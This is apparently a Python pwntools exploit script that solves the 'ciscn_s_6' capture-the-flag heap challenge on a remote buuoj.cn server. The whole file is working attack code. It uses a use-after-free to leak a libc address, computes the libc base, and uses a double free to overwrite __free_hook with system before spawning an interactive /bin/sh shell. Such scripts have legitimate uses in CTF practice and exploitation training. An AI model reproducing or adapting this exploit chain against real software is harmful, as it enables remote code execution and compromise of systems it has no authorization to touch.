from pwn import *

ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./ciscn_s_6"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 26744)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, name, call):
    sla("choice:", "1")
    sla("Please input the size of compary's name\n", str(size))
    sa("please input name:\n", name)
    sa("please input compary call:\n", call)

def show(index):
    sla("choice:", "2")
    sla("Please input the index:\n", str(index))

def call(index):
    sla("choice:", "3")
    sla("Please input the index:\n", str(index))


# uaf 

# leak libc
add(0x410, "a", "a")  # 0
add(0x20, "a", "a")   # 1
call(0)
show(0)
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["__malloc_hook"]-0x70
print("base: ", hex(base))
f_hook = base+libc.sym["__free_hook"]
print("f_hook: ", hex(f_hook))
system = base+libc.sym["system"]

# double free --> alter free_hook to system
call(1)
call(1)
add(0x20, p64(f_hook), "a")  # 2
add(0x20, "/bin/sh\x00", "a")# 3
add(0x20, p64(system), "a")  # 4

# attack
call(3)

shell()


